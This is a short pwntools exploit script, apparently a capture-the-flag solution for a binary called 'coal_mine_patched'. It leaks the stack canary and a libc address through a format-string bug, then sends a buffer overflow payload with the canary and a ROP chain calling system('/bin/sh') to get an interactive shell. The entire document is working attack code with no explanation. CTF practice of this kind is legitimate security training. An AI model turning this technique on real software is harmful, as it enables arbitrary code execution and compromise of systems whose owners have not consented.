from pwn import *
import re

elf = context.binary = ELF('./coal_mine_patched')
libc = ELF('./libc.so.6')
#context.log_level = "DEBUG"

p = process()
fmtstr = '%41$p%43$p'
p.sendafter(b'name?\n',fmtstr)
out = p.recvuntil(b'What').decode()
canary = int(re.findall(r'0x[0-9a-f]{16}', out)[0],16)
libc.address = int(re.findall(r'0x7[0-9a-f]{11}', out)[0],16)-0x21bf7

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]
ret = rop.find_gadget(["ret"])[0]
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym.system

exploit = b'A'*(0x110-0x90)
exploit += b'deadbeef'
exploit += b'A'*0x80
exploit += p64(canary) 
exploit += p64(0) 
exploit += p64(ret) 
exploit += p64(pop_rdi)
exploit += p64(bin_sh) 
exploit += p64(system)

p.sendafter(b"canary",exploit)
p.interactive()